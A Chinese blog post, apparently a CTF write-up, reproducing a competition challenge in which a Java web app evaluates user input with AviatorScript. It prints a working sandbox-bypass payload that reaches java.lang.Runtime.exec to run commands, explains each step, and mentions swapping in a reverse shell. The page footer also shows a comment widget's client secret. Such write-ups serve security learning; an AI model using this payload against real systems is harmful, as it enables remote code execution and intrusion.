<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />

    

    

    <title>江苏省第二届信息安全测试员技能竞赛ezchall复现 | 雨霖铃</title>
    <meta name="author" content="R4iny13lueB311" />
    <meta name="keywords" content="" />
    <meta name="description" content="…当时的0解题，当初信息搜集找到的确实是郁离歌学长的CVE-2021-41862以及as的官方文档，但其实原题是0CTF&amp;#x2F;TCTF2023的ezjava，12月9号打的比赛，而出题人关于这题的笔记却是12月14号写的，但是时至今日才复现成功，心里也算是五味杂陈……不过终究也算是学到东西。题目实现很简单，jar包直接运行就行，也算是从干看着javaweb相关的文章(经典流程之大量的源码和最后一个弹计算器的的截图，教人半懂不懂的)到了能一点点学着做的程度了。本地搭建：1java -jar " />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />

    
    <link rel="alternate" href="/atom.xml" title="雨霖铃" type="application/atom+xml">
    
    
    <link rel="icon" href="/images/favicon.ico">
    

    <style type="text/css">
    @font-face {
        font-family: 'icomoon';
        src: url("/fonts/icomoon.eot?q628ml");
        src: url("/fonts/icomoon.eot?q628ml#iefix") format('embedded-opentype'),
             url("/fonts/icomoon.ttf?q628ml") format('truetype'),
             url("/fonts/icomoon.woff?q628ml") format('woff'),
             url("/fonts/icomoon.svg?q628ml#icomoon") format('svg');
        font-weight: normal;
        font-style: normal;
    }
    </style>
    
<link rel="stylesheet" href="/css/style.css">


    <!--[if lt IE 9]><style type="text/css">.nav-inner {top:0;}.author-meta {position:static;top:0;}.search-form {height:36px;}</style><script type="text/javascript" src="https://unpkg.com/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
<meta name="generator" content="Hexo 7.0.0"></head>
<body>

    <main class="app">
        <header id="header" class="header clearfix">
    <div id="nav" class="nav">
    <div class="nav-mobile">
        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
        <h1 class="nav-mobile-title nav-mobile-item">雨霖铃</h1>
        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
    </div>

    <nav id="nav-inner" class="nav-inner">
        
            <a class="nav-item" href="/">
                <span class="nav-text">首页</span>
            </a>
        
            <a class="nav-item" href="/tags/CTF">
                <span class="nav-text">CTF</span>
            </a>
        
            <a class="nav-item" href="/tags/%E6%B8%97%E9%80%8F">
                <span class="nav-text">渗透</span>
            </a>
        
            <a class="nav-item" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B">
                <span class="nav-text">技术力</span>
            </a>
        
            <a class="nav-item" href="/archives">
                <span class="nav-text">归档</span>
            </a>
        
            <a class="nav-item" href="/about">
                <span class="nav-text">关于</span>
            </a>
        
    </nav>
</div>

    <aside id="aside" class="aside">
    <div id="aside-mask" class="aside-mask"></div>
    <div id="aside-inner" class="aside-inner">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="https://www.ayanagi.fun"></form>

        
        
        
        

        
        <div class="author-meta">
            
            <div class="author-avatar">
                <a href="/">
                    <img src="/images/avatar.png" title="R4iny13lueB311">
                </a>
            </div>
            
            <div class="author-name">R4iny13lueB311</div>
            <div class="author-work">Cyber Security Engineer</div>
            <div class="author-location">
                <i class="icon-location vm"></i>
                <span class="vm">Nanjing, China</span>
            </div>
            
            <div class="author-thread-wrap">
                <div class="author-threads clearfix">
                    
                        <a class="thread-item" href="https://github.com/linyuqi9" target="_blank" rel="noopener">
                            <!-- Generated by IcoMoon.io -->
<svg viewBox="0 0 1024 1024" width="38" height="38" fill="currentColor">
<path d="M512 32.12c-265.004 0-479.88 220.23-479.88 492.090 0 217.446 137.536 401.684 328.202 466.81 23.994 4.498 32.778-10.712 32.778-23.78 0-11.782-0.428-42.632-0.642-83.764-133.466 29.778-161.744-65.984-161.744-65.984-21.852-56.772-53.344-71.982-53.344-71.982-43.49-30.636 3.214-29.992 3.214-29.992 48.202 3.428 73.482 50.772 73.482 50.772 42.846 75.196 112.258 53.558 139.68 40.918 4.284-31.706 16.71-53.558 30.42-65.77-106.474-12.426-218.516-54.63-218.516-243.152 0-53.772 18.638-97.69 49.274-131.966-4.928-12.426-21.424-62.556 4.714-130.252 0 0 40.276-13.282 131.966 50.344 38.348-10.926 79.266-16.282 120.184-16.496 40.704 0.214 81.836 5.57 120.184 16.496 91.692-63.626 131.752-50.344 131.752-50.344 26.136 67.698 9.64 117.828 4.714 130.252 30.636 34.492 49.274 78.408 49.274 131.966 0 188.952-112.258 230.514-219.16 242.724 17.138 15.21 32.564 45.202 32.564 91.048 0 65.77-0.642 118.898-0.642 134.966 0 13.068 8.57 28.492 32.992 23.566 191.094-64.912 328.418-249.152 328.418-466.382 0-271.86-214.874-492.090-479.88-492.090z"></path>
</svg>

                        </a>
                    
                        <a class="thread-item" href="https://weibo.com/7458786450" target="_blank" rel="noopener">
                            <svg xmlns="http://www.w3.org/2000/svg" height="16" width="16" viewBox="0 0 512 512"><!--!Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2023 Fonticons, Inc.--><path d="M407 177.6c7.6-24-13.4-46.8-37.4-41.7-22 4.8-28.8-28.1-7.1-32.8 50.1-10.9 92.3 37.1 76.5 84.8-6.8 21.2-38.8 10.8-32-10.3zM214.8 446.7C108.5 446.7 0 395.3 0 310.4c0-44.3 28-95.4 76.3-143.7C176 67 279.5 65.8 249.9 161c-4 13.1 12.3 5.7 12.3 6 79.5-33.6 140.5-16.8 114 51.4-3.7 9.4 1.1 10.9 8.3 13.1 135.7 42.3 34.8 215.2-169.7 215.2zm143.7-146.3c-5.4-55.7-78.5-94-163.4-85.7-84.8 8.6-148.8 60.3-143.4 116s78.5 94 163.4 85.7c84.8-8.6 148.8-60.3 143.4-116zM347.9 35.1c-25.9 5.6-16.8 43.7 8.3 38.3 72.3-15.2 134.8 52.8 111.7 124-7.4 24.2 29.1 37 37.4 12 31.9-99.8-55.1-195.9-157.4-174.3zm-78.5 311c-17.1 38.8-66.8 60-109.1 46.3-40.8-13.1-58-53.4-40.3-89.7 17.7-35.4 63.1-55.4 103.4-45.1 42 10.8 63.1 50.2 46 88.5zm-86.3-30c-12.9-5.4-30 .3-38 12.9-8.3 12.9-4.3 28 8.6 34 13.1 6 30.8 .3 39.1-12.9 8-13.1 3.7-28.3-9.7-34zm32.6-13.4c-5.1-1.7-11.4 .6-14.3 5.4-2.9 5.1-1.4 10.6 3.7 12.9 5.1 2 11.7-.3 14.6-5.4 2.8-5.2 1.1-10.9-4-12.9z"/></svg>
                        </a>
                    
                        <a class="thread-item" href="https://space.bilibili.com/620585" target="_blank" rel="noopener">
                            <svg xmlns="http://www.w3.org/2000/svg" height="16" width="16" viewBox="0 0 512 512"><!--!Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2023 Fonticons, Inc.--><path d="M488.6 104.1C505.3 122.2 513 143.8 511.9 169.8V372.2C511.5 398.6 502.7 420.3 485.4 437.3C468.2 454.3 446.3 463.2 419.9 464H92C65.6 463.2 43.8 454.2 26.7 436.8C9.7 419.4 .8 396.5 0 368.2V169.8C.8 143.8 9.7 122.2 26.7 104.1C43.8 87.8 65.6 78.8 92 78H121.4L96.1 52.2C90.3 46.5 87.4 39.2 87.4 30.4C87.4 21.6 90.3 14.3 96.1 8.6C101.8 2.9 109.1 0 117.9 0C126.7 0 134 2.9 139.8 8.6L213.1 78H301.1L375.6 8.6C381.7 2.9 389.2 0 398 0C406.8 0 414.1 2.9 419.9 8.6C425.6 14.3 428.5 21.6 428.5 30.4C428.5 39.2 425.6 46.5 419.9 52.2L394.6 78L423.9 78C450.3 78.8 471.9 87.8 488.6 104.1H488.6zM449.8 173.8C449.4 164.2 446.1 156.4 439.1 150.3C433.9 144.2 425.1 140.9 416.4 140.5H96.1C86.5 140.9 78.6 144.2 72.5 150.3C66.3 156.4 63.1 164.2 62.7 173.8V368.2C62.7 377.4 66 385.2 72.5 391.7C79 398.2 86.9 401.5 96.1 401.5H416.4C425.6 401.5 433.4 398.2 439.7 391.7C446 385.2 449.4 377.4 449.8 368.2L449.8 173.8zM185.5 216.5C191.8 222.8 195.2 230.6 195.6 239.7V273C195.2 282.2 191.9 289.9 185.8 296.2C179.6 302.5 171.8 305.7 162.2 305.7C152.6 305.7 144.7 302.5 138.6 296.2C132.5 289.9 129.2 282.2 128.8 273V239.7C129.2 230.6 132.6 222.8 138.9 216.5C145.2 210.2 152.1 206.9 162.2 206.5C171.4 206.9 179.2 210.2 185.5 216.5H185.5zM377 216.5C383.3 222.8 386.7 230.6 387.1 239.7V273C386.7 282.2 383.4 289.9 377.3 296.2C371.2 302.5 363.3 305.7 353.7 305.7C344.1 305.7 336.3 302.5 330.1 296.2C323.1 289.9 320.7 282.2 320.4 273V239.7C320.7 230.6 324.1 222.8 330.4 216.5C336.7 210.2 344.5 206.9 353.7 206.5C362.9 206.9 370.7 210.2 377 216.5H377z"/></svg>
                        </a>
                    
                </div>
            </div>
            
        </div>
        
    </div>
</aside>

</header>

        <div id="content" class="content">
            <div id="wrapper" class="wrapper" style="max-width: 1200px">
                <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            江苏省第二届信息安全测试员技能竞赛ezchall复现
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="https://www.ayanagi.fun/2024/03/25/%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%91%98%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bezchall%E5%A4%8D%E7%8E%B0/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2024-03-25T05:53:40.000Z" itemprop="datePublished">2024-03-25</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag vm"></i>
    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>…</p>
<span id="more"></span>

<p>当时的0解题，当初信息搜集找到的确实是郁离歌学长的CVE-2021-41862以及as的官方文档，但其实原题是0CTF&#x2F;TCTF2023的ezjava，12月9号打的比赛，而出题人关于这题的笔记却是12月14号写的，但是时至今日才复现成功，心里也算是五味杂陈……不过终究也算是学到东西。</p>
<p>题目实现很简单，jar包直接运行就行，也算是从干看着javaweb相关的文章(经典流程之大量的源码和最后一个弹计算器的的截图，教人半懂不懂的)到了能一点点学着做的程度了。</p>
<p>本地搭建：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ezchall.jar</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240325140023975.png" alt="image-20240325140023975"></p>
<p>然后访问127.0.0.1就可以在本地测试了。</p>
<p>反编译看源码，定位到控制器：<code>\BOOT-INF\classes\com\example\ctf\IndexController</code></p>
<p><img src="/images/image-20240325140210048.png" alt="image-20240325140210048"></p>
<p>eval路由存在以下实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam(name = &quot;s&quot;,defaultValue = &quot;&quot;)</span> String s, Model model)</span> &#123;</span><br><span class="line">    <span class="type">ScriptEngineManager</span> <span class="variable">sem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> sem.getEngineByName(<span class="string">&quot;AviatorScript&quot;</span>);</span><br><span class="line">    <span class="type">AviatorEvaluatorInstance</span> <span class="variable">instance</span> <span class="operator">=</span> ((AviatorScriptEngine)engine).getEngine();</span><br><span class="line">    instance.setOption(Options.FEATURE_SET, Feature.asSet(<span class="keyword">new</span> <span class="title class_">Feature</span>[]&#123;Feature.Assignment, Feature.ForLoop, Feature.WhileLoop, Feature.Lambda, Feature.Let&#125;));</span><br><span class="line">    HashSet&lt;Object&gt; classes = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">    instance.setOption(Options.ALLOWED_CLASS_SET, classes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>, engine.eval(s));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当初也是看到这里就去找的aviatorscript相关的rce，但是没有成功利用的。今天才看到文章：<code>https://www.imwxz.com/posts/bd94fce0.html</code>讲得很详细了，针对CVE-2021-41862推出修复后的版本如何继续绕过。</p>
<p>文中提到：安全沙箱主要分为三个防护手段：语言特性、class白名单、反射调用。</p>
<ul>
<li>语言特性：可以开启和关闭表达式语言特性，例如 <code>instance.setOption(Options.FEATURE_SET, Feature.asSet());</code></li>
<li>class白名单：控制可被调用的class白名单，例如 <code>instance.setOption(Options.ALLOWED_CLASS_SET, new HashSet());</code></li>
<li>反射调用：控制是否开启反射，例如 <code>instance.setFunctionMissing(null);</code></li>
</ul>
<p>poc：<code>exec(invoke(getMethod(loadClass(getClassLoader(getClass(constantly(1))),&#39;java.lang.Runtime&#39;),&#39;getRuntime&#39;,nil),nil,nil),&#39;calc&#39;)</code></p>
<p>在网页中传入就可以直接弹出计算器</p>
<p><img src="/images/image-20240325140610618.png" alt="image-20240325140610618"></p>
<p>接下来讨论如何对poc进行理解。</p>
<p>题目允许了<code>Feature.Assignment, Feature.ForLoop, Feature.WhileLoop, Feature.Lambda, Feature.Let</code>这样一些特性，文章中却没有，但白名单不允许任何类这一点是相同的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instance.setOption(Options.ALLOWED_CLASS_SET, <span class="keyword">new</span> <span class="title class_">HashSet</span>());</span><br></pre></td></tr></table></figure>

<p>poc的核心原理：</p>
<p>aviator 4.2.5 引入了一个新的方式：基于反射的自动方法发现和调用。原来对象的 object.method(args) 调用方式，转化成 method(object, args) 就可以</p>
<p>而且，要知道默认的类加载器是无法获取的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.getClass()</span><br><span class="line"><span class="comment">// class java.lang.String</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.getClass().getClassLoader()</span><br><span class="line"><span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p>最简单的解决方案就是使用函数或闭包，此处由于允许lambda，但不允许fn(具体参考：<code>https://www.yuque.com/boyan-avfmj/aviatorscript/yr1oau</code>中的语法特性：FEATURE_SET)，也无法进行如文中举例一样的利用。</p>
<p>所以会导致报错，这也是为什么打以前的poc打不动的原因之一。解决方案是寻找一个自带的外部类，as自带的函数库中有<code>constantly(x)</code>，作用是返回一个函数。然后需要简单从0先熟悉常规命令执行链：</p>
<p><code>loadClass-&gt;getMethod-&gt;invoke-&gt;exec</code></p>
<p>首先最里的一层是<code>getClassLoader(getClass(constantly(1)))</code>，先调用getclass获取函数的类，然后获取它的类加载器。这里按照正常的java语言是不可以这样的，因为getclassloder不接受任何参数，是要用<code>constantly(1).getClass().getClassLoder()</code>才能用的，由于as的特性，才能得以实现。</p>
<p>接着，继续利用该特性：<code>method(object, args)</code>来调用。</p>
<p>往外走，来到<code>loadClass()</code>这一层，第一个object的位置是一个classloder，需要用它来加载<code>&#39;java.lang.Runtime&#39;</code>，因此有了<code>loadClass(getClassLoader(getClass(constantly(1))),&#39;java.lang.Runtime&#39;)</code></p>
<p>而我们看一下loadclass()的原版实现就不难理解了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>.</code>前面的<code>CLassLoader()</code>就是object，<code>&#39;java.lang.Runtime&#39;</code>就是args。</p>
<p>继续往外走，<code>getMethod</code>的object是我们加载好的类，两个args是<code>getRuntime</code>和<code>nil</code>，不完全等价于<code>java.lang.Runtime.getRuntime()</code>，返回的是method_name为<code>&#39;getRuntime&#39;</code>的method对象，需要通过invoke才能调用。</p>
<p>原版实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke(Object obj, Object... args)</span><br><span class="line">CLassloder().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(nil)</span><br><span class="line"><span class="comment">//等价于java.lang.Runtime.getRuntime()，由于getRuntime()是静态方法，所以invoke传递null</span></span><br></pre></td></tr></table></figure>

<p>最后，就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<p>由于<code>getRuntime()</code>通过的是前面一长串的invoke调用得来，所以改写成as的方式就变成了<code>exec(..., &#39;calc&#39;)</code></p>
<p>可以改成其他反弹shell类的命令，博主本机用的win来搭建题目，所以执行win类的命令有效，考虑比赛时靶机应当是linux，反弹shell后就随便玩了。</p>
<p><img src="/images/QQ%E6%88%AA%E5%9B%BE20240325162348.png" alt="QQ截图20240325162348"></p>
<p>至此，想必也算是对javaweb有了一个初步的入门。</p>

        
    </section>
</article>



<div class="comments">
    <div id="comments"></div>
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
    new Gitalk({
        clientID: "8db4b4a89548994388e9",
        clientSecret: "83900737a29fd1d7795db259d911ae2deba58908",
        repo: "linyuqi9.github.io",
        owner: "linyuqi9",
        admin: ["linyuqi9"],
        id: "df58b50df915ddb2a7f41aeb314aa4aa",
        distractionFreeMode: true,
        title: "江苏省第二届信息安全测试员技能竞赛ezchall复现",
        body: "https://www.ayanagi.fun/2024/03/25/%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%91%98%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bezchall%E5%A4%8D%E7%8E%B0/",
        labels: ["CTF"]
    }).render('comments');
    </script>
</div>



            </div>
        </div>

        
            
            <a id="pagenext" href="/2024/03/25/RW2024/" class="article-next" title="RWCTF 2024 体验赛个人wp"><i class="icon-arrow-right"></i></a>
            
            
        

        <footer class="footer">
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>

    
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?3f0e368eb1f22fb5a593be6193301ba9";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
    
</footer>

    </main>

    <script type="text/javascript" src="https://unpkg.com/jquery@1.9.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(function() {
        var nodes = {
            nav: $('#nav'),
            aside: $('#aside'),
            asideInner: $('#aside-inner'),
            navInner: $('#nav-inner')
        };

        var doing = false;
        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
            if (nodes.aside.hasClass('mobile-open')) {
                nodes.aside.removeClass('mobile-open');
            } else {
                nodes.aside.removeClass('mobile-close panel-show');
            }
            doing = false;
        });
        $('#open-panel, #aside-mask').on('click', function() {
            if (doing) {
                return;
            }

            if (nodes.aside.hasClass('panel-show')) {
                nodes.aside.addClass('mobile-close');
            } else {
                nodes.aside.addClass('mobile-open panel-show');
            }
        });
        $('#open-menus').on('click', function() {
            nodes.navInner.slideToggle('normal', slideDone);
        });

        if (window.innerWidth <= 960) {
            setTimeout(function() {
                nodes.navInner.slideUp('normal', slideDone);
            }, 3000);
        }

        function slideDone() {
            if (nodes.navInner.css('display') !== 'none') {
                nodes.navInner.css('display', '');
            }
        }

        $(window).on('resize', function() {
            if ($(this).width() > 960) {
                nodes.navInner.css('display', '');
            }
        });
    });
    </script>
    
        
<script src="/js/scrollspy.min.js"></script>

        <script type="text/javascript">
        $(document.body).scrollspy({target: '#aside-inner'});

        $(window).on('resize', function() {
            var hw = $('#header').width();
            var ww = $('#wrapper').width();
            var space = ($(this).width() - hw - ww) / 2 / 2;

            var pageprev = $('#pageprev');
            var pagenext = $('#pagenext');
            var avg = (pageprev.width() + pagenext.width()) / 2

            if(space > avg) {
                var len = space - avg / 2;
                var styles = {position: 'fixed', top: '50%', marginTop: - (pageprev.width() + pagenext.width()) / 4}
                pageprev.css($.extend({left: hw + len}, styles));
                pagenext.css($.extend({right: len}, styles));
            } else {
                pageprev.removeAttr('style');
                pagenext.removeAttr('style');
            }
        }).trigger('resize');
        </script>
    

</body>
</html>
